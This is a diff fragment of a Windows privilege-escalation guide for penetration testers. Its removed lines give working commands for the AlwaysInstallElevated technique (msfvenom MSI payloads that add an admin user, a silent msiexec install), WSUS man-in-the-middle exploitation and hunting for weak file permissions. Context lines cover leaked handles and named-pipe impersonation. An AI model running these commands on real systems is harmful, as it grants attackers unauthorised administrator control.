-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-```
-
-### Metasploit payloads
-
-```bash
-msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
-msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
-```
-
-If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**
-
-### PowerUP
-
-Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges:
-
-```text
-Write-UserAddMSI
-```
-
-Just execute the created binary to escalate privileges.
-
-### MSI Wrapper
-
-Read this tutorial to learn how to create a MSI wrapper using this tools:
-
-{% page-ref page="msi-wrapper.md" %}
-
-### MSI Installation
-
-To execute the **installation** of the **malicious `.msi`** file in **background:**
-
-```text
-msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
-```
-
-To exploit this vulnerability you can use: _exploit/windows/local/always\_install\_elevated_
-
-## WSUS
-
-You can compromise the system if the updates are not requested using http**S** but http.
-
-You start by checking if the network uses a non-SSL WSUS update by running the following:
-
-```text
-reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
-```
-
-If you get a reply such as:
-
-```bash
-HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
-      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
-```
-
-And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` is equals to 1.
-
-Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.
-
-You can use: [Wsuxploit](https://github.com/pimps/wsuxploit) - This is a MiTM weaponized exploit script to inject 'fake' updates into non-SSL WSUS traffic.
-
-{% file src="../../.gitbook/assets/ctx\_wsuspect\_white\_paper \(1\).pdf" %}
-
-## Write Permissions
-
-Check if you can modify some config file to read some special file or if you can modify some binary that is going to be executed by an Administrator account \(schedtasks\).
-
-A way to find weak folder/files permissions in the system is doing:
-
-```bash
-accesschk.exe /accepteula 
-# Find all weak folder permissions per drive.
-accesschk.exe -uwdqs Users c:\
-accesschk.exe -uwdqs "Authenticated Users" c:\
-accesschk.exe -uwdqs "Everyone" c:\
-# Find all weak file permissions per drive.
-accesschk.exe -uwqs Users c:\*.*
-accesschk.exe -uwqs "Authenticated Users" c:\*.*
-accesschk.exe -uwdqs "Everyone" c:\*.*
-```
-
-```bash
-icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
-icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
-```
-
-```bash
-Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 
-
-Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
-```
-
 ## Leaked Handlers
 
 Imagine that **a process running as SYSTEM open a new process** \(`OpenProcess()`\) with **full access**. The same process **also create a new process** \(`CreateProcess()`\) **with low privileges but inheriting all the open handles of the main process**.  
@@ -1088,12 +1185,6 @@ A `pipe` is a block of shared memory that processes can use for communication an
 `Named Pipes` is a Windows mechanism that enables two unrelated processes to exchange data between themselves, even if the processes are located on two different networks. It's very similar to client/server architecture as notions such as `a named pipe server` and a named `pipe client` exist.
 
 When a **client writes on a pipe**, the **server** that created the pipe can **impersonate** the **client** if it has **SeImpersonate** privileges. Then, if you can find a **privileged process if going to write on any pipe that you can impersonate**, you could be able to **escalate privileges** impersonating that process after it writes inside your created pipe. [**You can read this to learn how to perform this attack**](named-pipe-client-impersonation.md)**.**
-
-### Insecure GUI apps
-
-Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.
-
-Example: "Windows Help and Support" \(Windows + F1\), search for "command prompt", click on "Click to open Command Prompt"
 
 ## From Administrator Medium to High Integrity Level / UAC Bypass
 
